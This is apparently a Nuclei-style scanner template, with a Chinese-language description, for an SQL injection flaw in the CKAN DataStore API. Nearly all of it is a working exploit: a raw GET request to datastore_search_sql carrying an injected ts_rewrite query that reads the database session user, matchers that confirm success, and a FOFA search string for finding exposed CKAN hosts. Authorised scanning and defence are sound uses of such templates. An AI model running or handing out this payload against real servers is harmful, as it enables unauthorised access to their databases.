id: ckan-datastore-sql-injection

info:
  name: "CKAN DataStore接口SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    CKAN 数据资源管理系统 DataStore 存在 SQL 注入漏洞。fofa: title="CKAN"
  tags: CKAN

http:
- raw:
  - |
    GET /api/action/datastore_search_sql?sql=SELECT+ts_rewrite('a'::tsquery,+'SELECT+''a''::tsquery,+(SELECT+session_user)::tsquery') HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
      - 'help'
      - 'success'
      - 'result'
    condition: and
